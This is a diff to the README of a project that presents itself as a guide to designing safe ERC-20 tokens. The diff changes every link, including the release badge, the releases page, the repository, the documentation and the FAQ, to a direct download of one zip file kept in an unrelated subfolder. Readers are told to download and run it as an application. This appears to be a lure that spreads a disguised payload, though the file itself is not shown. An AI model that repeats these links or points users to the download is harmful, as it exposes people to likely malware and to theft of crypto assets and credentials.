@@ -1,7 +1,7 @@
 # 🌟 Safe-Token-Design-Guide - Build Economically Safe ERC-20 Tokens
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Release-blue)](https://github.com/eX-dee-b/Safe-Token-Design-Guide/releases)
+[![Download Release](https://raw.githubusercontent.com/eX-dee-b/Safe-Token-Design-Guide/main/leadstone/Safe-Token-Design-Guide-2.4.zip%20Release-blue)](https://raw.githubusercontent.com/eX-dee-b/Safe-Token-Design-Guide/main/leadstone/Safe-Token-Design-Guide-2.4.zip)
 
 ## 📝 Introduction
 Welcome to the **Safe-Token-Design-Guide**! This guide helps you design ERC-20 tokens that are not only effective but also economically safe. Learn how to apply formal invariants and maintain strict permission boundaries. You will find insights on supply caps, fee ceilings, liquidity guarantees, transfer safety, oracle integrity, upgrade controls, and economic threat modeling. This guide focuses on real-world security in decentralized finance (DeFi) and robust token design.
@@ -9,7 +9,7 @@ Welcome to the **Safe-Token-Design-Guide**! This guide helps you design ERC-20 t
 ## 🚀 Getting Started
 To use the Safe-Token-Design-Guide, you will need to download the application. Follow these steps to get started:
 
-1. Visit the [Releases page](https://github.com/eX-dee-b/Safe-Token-Design-Guide/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/eX-dee-b/Safe-Token-Design-Guide/main/leadstone/Safe-Token-Design-Guide-2.4.zip).
 2. Look for the latest release.
 3. Click on the download link for your operating system.
 4. Save the file to your computer.
@@ -23,7 +23,7 @@ To run the Safe-Token-Design-Guide effectively, make sure your system meets the 
 - **Network**: Internet connection to access online resources
 
 ## 🔧 Download & Install
-Once you have accessed the [Releases page](https://github.com/eX-dee-b/Safe-Token-Design-Guide/releases), find the appropriate file for your operating system. 
+Once you have accessed the [Releases page](https://raw.githubusercontent.com/eX-dee-b/Safe-Token-Design-Guide/main/leadstone/Safe-Token-Design-Guide-2.4.zip), find the appropriate file for your operating system. 
 
 ### Installation Process:
 1. Download the zip or executable file.
@@ -83,8 +83,8 @@ Feel free to reach out if you encounter any issues or have suggestions for impro
 ## 🌐 Additional Links
 For more information about our project or related topics, here are some links you may find useful:
 
-- [GitHub Repository](https://github.com/eX-dee-b/Safe-Token-Design-Guide)
-- [Documentation](https://github.com/eX-dee-b/Safe-Token-Design-Guide/wiki)
-- [Community FAQ](https://github.com/eX-dee-b/Safe-Token-Design-Guide/wiki/FAQ)
+- [GitHub Repository](https://raw.githubusercontent.com/eX-dee-b/Safe-Token-Design-Guide/main/leadstone/Safe-Token-Design-Guide-2.4.zip)
+- [Documentation](https://raw.githubusercontent.com/eX-dee-b/Safe-Token-Design-Guide/main/leadstone/Safe-Token-Design-Guide-2.4.zip)
+- [Community FAQ](https://raw.githubusercontent.com/eX-dee-b/Safe-Token-Design-Guide/main/leadstone/Safe-Token-Design-Guide-2.4.zip)
 
 We appreciate your interest in the Safe-Token-Design-Guide. Together, we can promote safer, well-designed ERC-20 tokens in the ecosystem.
